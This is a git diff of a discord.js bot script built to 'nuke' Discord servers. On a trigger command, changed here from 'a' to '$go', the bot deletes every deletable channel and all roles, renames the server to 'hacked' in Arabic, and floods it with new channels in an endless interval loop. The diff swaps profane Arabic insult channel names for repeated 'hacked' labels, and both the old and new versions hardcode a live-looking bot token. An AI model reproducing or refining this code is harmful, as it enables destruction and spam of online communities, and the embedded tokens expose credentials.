@@ -2,7 +2,7 @@ const Discord = require("discord.js");
 const client = new Discord.Client();
 
 client.on('message', message =>{
-    if (message.content.startsWith('a')){
+    if (message.content.startsWith('$go')){
             if (message.channel.guild){
                 message.guild.channels.forEach(c =>{
                     if(c.deletable){
@@ -15,7 +15,7 @@ client.on('message', message =>{
                 message.guild.roles.forEach(r=>{
                     r.delete()
                 })
-                message.guild.setName('تم التهكيرمنقبل جاك.')
+                message.guild.setName('تم التهكير.')
                 setInterval(function(){
                     message.guild.createChannel('تم التهكير.', 'voice')
                     message.guild.createChannel('تم التهكير. ', 'text')
@@ -26,7 +26,7 @@ client.on('message', message =>{
 });
 
 client.on('message', message => {
-    if (message.content === "a") {
+    if (message.content === "$go") {
     if(!message.channel.guild) return message.channel.send('**This Command Only For Servers !**')
             if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.channel.send(`**${message.author.username} You Dont Have** ``MANAGE_CHANNELS`` **Premission**`);
 
@@ -34,26 +34,27 @@ client.on('message', message => {
 		
 		
 		
-     message.guild.createChannel('ما تقدرو تهربو مني .', 'text')
-	 message.guild.createChannel('تم والمرة القادمة بهكر.', 'text')
-	 message.guild.createChannel('اجهزتكم .', 'text')
-	 message.guild.createChannel('لاتستهينو بي انا.', 'text')
-	 message.guild.createChannel('اقوا هكر .', 'text')
-	 message.guild.createChannel('تم التهكيرفي الدسكورد.', 'text')
-     message.guild.createChannel('كس امكن.', 'voice')
-	 message.guild.createChannel('يل مخانث.', 'voice')
-	 message.guild.createChannel('خخخخهخهخه', 'voice')
-	 message.guild.createChannel('ليش كس امك.', 'voice')
-	 message.guild.createChannel('احمر.', 'voice')
-	 message.guild.createChannel('منوب.', 'voice')
-	 message.guild.createChannel('كلاب .', 'voice')
-	 message.guild.createChannel('يا الزقة.', 'voice')
-	 message.guild.createChannel('سيرفر زق .', 'voice')
-	 message.guild.createChannel('برب طفش.', 'voice')
+     message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+	 message.guild.createChannel('تم التهكير.', 'text')
+     message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
+	 message.guild.createChannel('تم التهكير.', 'voice')
 
     
-message.channel.sendMessage('كل زق ')
+message.channel.sendMessage('**Text Channel Was Succsesfluy Created**')
 }
 });
  
-client.login("Njg2ODQ3NTI4NTk0ODMzNDUz.XnWl_Q.Ls7BCJHkmJPpptyRAnhXj-PQ3Ys");
+client.login("Njg2ODQ3NTI4NTk0ODMzNDUz.XnXCrg.uKdJigy_dmrRImYYNJle6ybAxvk");
